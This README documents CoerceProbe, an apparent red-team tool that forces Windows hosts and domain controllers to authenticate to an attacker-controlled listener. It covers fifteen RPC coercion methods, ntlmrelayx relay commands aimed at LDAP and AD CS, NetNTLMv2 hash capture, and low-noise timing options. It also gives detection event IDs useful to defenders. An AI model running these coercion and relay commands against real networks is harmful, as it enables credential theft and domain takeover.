# CoerceProbe

**Authentication-coercion validation for Windows and Active Directory.**

Author: **kalraji007** · Version: **1.0.0** · License: MIT

> ## Authorized security testing only
>
> CoerceProbe forces authentication traffic and can trigger alerts, service
> disruption, or account lockout. **You are solely responsible** for obtaining
> written permission, staying within the agreed scope, and complying with all
> applicable laws. The author accepts **no liability** for misuse, damage, or
> legal consequences. If you are not explicitly authorized to test the target,
> do not run this tool. Merely reading the help text does not grant permission.

---

## What it is

CoerceProbe triggers documented Windows RPC methods that make a machine
authenticate to a listener you control. It is a validation tool for red teams,
purple teams, and AD hardening work — not an exploitation framework. It does
not exploit memory corruption, drop payloads, persist, or modify target files.

It supports:

- **15 built-in coercion methods** across MS-RPRN, MS-EFSR, MS-DFSNM,
  MS-FSRVP, MS-EVEN, MS-DNSP, and MS-DHCPM
- **External or built-in listener** — use Responder/ntlmrelayx, or let
  CoerceProbe start its own SMB2 capture listener
- **Single target, multiple targets, or a target list file**
- **Low-noise options** for controlled engagements
- **Endpoint-mapper discovery** for TCP-only RPC interfaces
- **JSON-lines output** and local evidence logging

---

## Supported methods

| Method | Protocol | Function | Notes |
|---|---|---|---|
| `printer` | MS-RPRN | `RpcRemoteFindFirstPrinterChangeNotificationEx` (65) | PrinterBug / SpoolSample |
| `efsr-open` | MS-EFSR | `EfsRpcOpenFileRaw` (0) | PetitPotam classic |
| `efsr-encrypt` | MS-EFSR | `EfsRpcEncryptFileSrv` (4) | PetitPotam variant |
| `efsr-decrypt` | MS-EFSR | `EfsRpcDecryptFileSrv` (5) | PetitPotam variant |
| `efsr-query-users` | MS-EFSR | `EfsRpcQueryUsersOnFile` (6) | PetitPotam variant |
| `efsr-query-recovery` | MS-EFSR | `EfsRpcQueryRecoveryAgents` (7) | PetitPotam variant |
| `efsr-file-key` | MS-EFSR | `EfsRpcFileKeyInfo` (12) | PetitPotam variant |
| `dfs-add` | MS-DFSNM | `NetrDfsAddStdRoot` (12) | DFSCoerce |
| `dfs-remove` | MS-DFSNM | `NetrDfsRemoveStdRoot` (13) | DFSCoerce |
| `shadow-supported` | MS-FSRVP | `IsPathSupported` (8) | ShadowCoerce |
| `shadow-copied` | MS-FSRVP | `IsPathShadowCopied` (9) | ShadowCoerce |
| `even` | MS-EVEN | `ElfrOpenBELW` (9) | CheeseOunce; often null session |
| `dns-logpath` | MS-DNSP | `R_DnssrvOperation` / `LogFilePath` (0) | **Less common**; requires DnsAdmins |
| `dhcp-backup` | MS-DHCPM | `R_DhcpBackupDatabase` (44) | **Less common**; requires DHCP Administrators |
| `dhcp-restore` | MS-DHCPM | `R_DhcpRestoreDatabase` (45) | **Less common**; requires DHCP Administrators |

Aliases: `print`, `spooler`, `petitpotam`, `efsr`, `dfs`, `shadow`, `cheese`,
`eventlog`, `dns`, `dhcp`.

**Not bundled:** WSPCoerce (MS-WSP), MS-COMA `ImportFromFile`, and the rarer
PLA/WINS/UAMG/VDS primitives. They require separate protocol implementations.
The method catalogue is intentionally explicit so the tool does not pretend to
cover everything.

---

## Install

```bash
python3 -m pip install impacket
```

On Kali, Impacket is usually available. For an isolated install:

```bash
python3 -m venv .venv
.venv/bin/pip install -r requirements.txt
```

---

## Quick start

### 1. Start an external listener (Responder or ntlmrelayx)

```bash
sudo responder -I eth0 -v

# Or relay:
impacket-ntlmrelayx -t ldap://dc01.corp.local --delegate-access -smb2support
# impacket-ntlmrelayx -t http://ca01.corp.local/certsrv/certfnsh.asp \
#   -smb2support --adcs --template DomainController
```

### 2. Trigger one low-noise method

```bash
python3 coerceprobe.py \
  --target dc01.corp.local --target-ip 10.0.0.10 \
  --listener 10.0.0.50 \
  --username alice --domain CORP \
  --method printer --stealth
```

The password is prompted if omitted. Prefer that over `--password` so it does
not appear in shell history or process listings.

### 3. Use the built-in listener

```bash
sudo python3 coerceprobe.py \
  --target dc01.corp.local \
  --listen --listen-port 445 \
  --username alice --domain CORP \
  --method printer
```

The listener prints captured machine-account authentication:

```text
[+] SMB authentication from 10.0.0.10: CORP\DC01$ (host: DC01)
    NetNTLMv2: DC01$::CORP:1122334455667788:...
```

Use `--capture-log captures.txt` to append NetNTLMv2 lines to a file.

> Port 445 normally requires root. Stop Responder or any other SMB service
> before using `--listen`; only one process can bind the port.

### 4. Multiple targets

```bash
# Repeatable --target
python3 coerceprobe.py \
  --target dc01.corp.local --target dc02.corp.local \
  --listener 10.0.0.50 \
  --username alice --domain CORP \
  --method printer

# Comma-separated
python3 coerceprobe.py --targets dc01,dc02,dc03 ...

# File: one target per line, optional "host,ip"
python3 coerceprobe.py --targets-file targets.txt ...
```

Example `targets.txt`:

```text
# host[,ip]
dc01.corp.local,10.0.0.10
dc02.corp.local,10.0.0.11
fileserver.corp.local
```

### 5. Dry run

```bash
python3 coerceprobe.py --dry-run \
  --target dc01.corp.local --listener 10.0.0.50 \
  --username alice --domain CORP --method all
```

No network traffic is sent.

---

## Result status

| Status | Meaning |
|---|---|
| `CALL_OK` | RPC call completed without error. Likely coercion; verify the listener. |
| `LIKELY` | RPC error consistent with the target reaching the listener, e.g. `ERROR_BAD_NETPATH`. |
| `AMBIGUOUS` | Could be blocked/patched or a normal post-callback failure. Verify the listener. |
| `DENIED` | Access denied; caller lacks rights or the RPC path is filtered. |
| `UNREACHABLE` | Target or listener unreachable. |
| `UNSUPPORTED` | Interface or service unavailable. |
| `ERROR` | Other error; inspect the message. |

**The RPC result is not proof.** Coercion is confirmed by seeing the target’s
machine-account authentication on the listener. A `CALL_OK` only means the
call was accepted.

---

## Built-in listener vs external listener

| | Built-in `--listen` | Responder / ntlmrelayx |
|---|---|---|
| Captures NetNTLMv2 | Yes | Yes |
| Relays authentication | No | Yes |
| Needs root for 445 | Yes | Yes |
| WebDAV/HTTP listener | No | Yes (with HTTP listener) |
| Best for | Quick proof, lab, evidence | Full relay chain |

Use the built-in listener when you only need to prove coercion. Use
ntlmrelayx when the engagement requires relay to LDAP, ADCS, or SMB.

---

## Low-noise options

Coercion is inherently visible at the RPC and authentication layers. There is
no guaranteed “undetectable” mode. These options reduce volume and timing
artifacts:

- **Listener preflight** — verifies the listener port is open before sending
  authentication traffic.
- **`--stealth`** — 4s base delay, 3s jitter, no retries, stop on first
  success-like result.
- **`--stop-on-success`** — stops trying methods after the first likely hit.
- **`--randomize-unc`** — randomizes the UNC path component.
- **No retries by default** — repeated failures are noisy and rarely useful.
- **Credential prompt** — avoids passwords in shell history.
- **One target at a time, sequential methods** — no subnet scanning, no
  parallel threads.
- **`--dry-run`** — validate the call plan before generating traffic.
- **`--json`** — machine-readable output without chatty banners.

Deliberately **not** included: log tampering, AMSI/ETW patching, AV/EDR
evasion, process injection, persistence, or credential dumping. Those are
separate offensive tradecraft, not “stealth.”

---

## Transport and endpoint discovery

- Default `--transport auto` uses SMB named pipes for most methods and TCP for
  DNS/DHCP.
- TCP methods use the endpoint mapper on TCP/135 to find the dynamic RPC port.
- `--rpc-port` overrides discovery.
- `--no-epm` disables discovery and requires `--rpc-port`.
- `--transport tcp` forces TCP for a method; `--transport smb` forces SMB.
- Windows 11 22H2+ and Server 2025 use RPC over TCP for print by default. If
  the spoolss named pipe is unavailable, try `--transport tcp`.

---

## Detection notes

Coercion generates telemetry. Useful sources:

- **5145** — named-pipe access to `spoolss`, `netdfs`, `FssagentRpc`,
  `lsarpc`, `efsrpc`, `eventlog` on `IPC$`.
- **4624** type 3 and **4776** — NTLM network logon / credential validation.
- **4768/4769** — Kerberos TGT/TGS anomalies, including PKINIT.
- **4741/4742** — computer-account creation/modification (RBCD).
- **4886/4887** — AD CS certificate requests.
- Outbound SMB/RPC from a DC or server to an unexpected host.
- A single host receiving authentication from many servers in a short window.

CoerceProbe is also useful for generating known-good telemetry in a lab so
detections can be tuned.

---

## Limitations

- Coercion does **not** equal relay or code execution. You still need a relay
  target or a listener that captures the authentication.
- `even` often produces a null/anonymous session because EventLog runs as
  `LOCAL SERVICE`; treat it as environment-dependent.
- DNS/DHCP methods require privileged group membership (DnsAdmins / DHCP
  Administrators) and the relevant server role.
- **`dns-logpath` changes the DNS debug log path** and **`dhcp-restore` can
  alter DHCP configuration**. Record the original state and restore it after
  testing. These are not read-only checks.
- WSPCoerce and the long-tail COM+/PLA/WINS/UAMG/VDS methods are not bundled.
- `--listen` is SMB-only. It does not provide an HTTP/WebDAV listener.
- The built-in listener captures NTLMv2; Kerberos authentication will not
  appear as a hash.
- No tool can guarantee “without detection.” Coercion creates real
  authentication traffic.

---

## Suggested uses

- Validate whether a DC still exposes the spooler.
- Confirm whether DFSCoerce/EFSRPC paths are blocked by RPC filters.
- Test whether disabling remote spooler client connections stops PrinterBug.
- Prove DNS/DHCP coercion paths that are rarely covered by standard tooling.
- Generate telemetry for 5145/4624/4776 detection engineering.
- Exercise relay chains in a lab with explicit authorization.

---

## Credits and references

- Impacket — SMB/RPC primitives and SMB server
- p0dalirius / Coercer — protocol catalogue and method references
- SpecterOps — PrinterBug and AD CS research
- 0patch — coercion analysis and micropatches
- Microsoft — MS-RPRN, MS-EFSR, MS-DFSNM, MS-FSRVP, MS-EVEN, MS-DNSP, MS-DHCPM documentation

Key references:

- [MS-RPRN opnum 65](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d)
- [PetitPotam](https://github.com/topotam/PetitPotam)
- [Coercer](https://github.com/p0dalirius/Coercer)
- [Windows coerced authentication methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [0patch PrinterBug analysis](https://web.archive.org/web/20251203201115/https://blog.0patch.com/2022/06/micropatching-printerbugspoolsample.html)
- [0patch DFSCoerce analysis](https://web.archive.org/web/20251203201114/https://blog.0patch.com/2022/07/micropatching-dfscoerce-forced.html)
- [0patch WSPCoerce](https://blog.0patch.com/2025/07/micropatches-released-for-wspcoerce.html)
- [Unit 42: Authentication Coercion Keeps Evolving](https://unit42.paloaltonetworks.com/authentication-coercion/)
- [MS-DNSP R_DnssrvOperation](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/9500a7e8-165d-4b13-be86-0ddc43100eef)
- [MS-DHCPM R_DhcpBackupDatabase](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dhcpm/f2b03c0f-218d-47dd-87f4-c1be817b366b)

---

## Roadmap

Useful additions for future releases:

- WSPCoerce (MS-WSP) and MS-COMA `ImportFromFile` modules
- `--probe-services` preflight (spooler/DFS/EFSRPC/FSRVP/DNS/DHCP presence)
- Relay profiles that generate, but do not execute, ntlmrelayx commands
- HTTP/WebDAV capture listener for `--webdav`
- Optional PCAP capture and evidence bundle output
- `--resume` state file for large target lists
- SOCKS5 proxy support for segmented networks
- Per-method timeout and request-rate controls
- More CI coverage for NDR encoding and listener behavior

---

## License

MIT. See [LICENSE](LICENSE).
